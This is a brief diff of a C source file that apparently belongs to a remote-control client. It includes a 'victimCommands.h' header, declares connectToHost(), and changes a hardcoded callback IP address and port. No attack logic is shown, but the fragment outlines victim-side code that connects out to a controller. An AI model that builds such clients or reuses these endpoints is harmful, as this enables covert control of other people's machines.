@@ -3,8 +3,8 @@
 #include <stdbool.h>
 #include "victimCommands.h"
 
-#define PORT 11091
-#define IP "52.14.18.129"
+#define PORT 14097
+#define IP "3.134.125.175"
 
 // Functions
 void connectToHost();
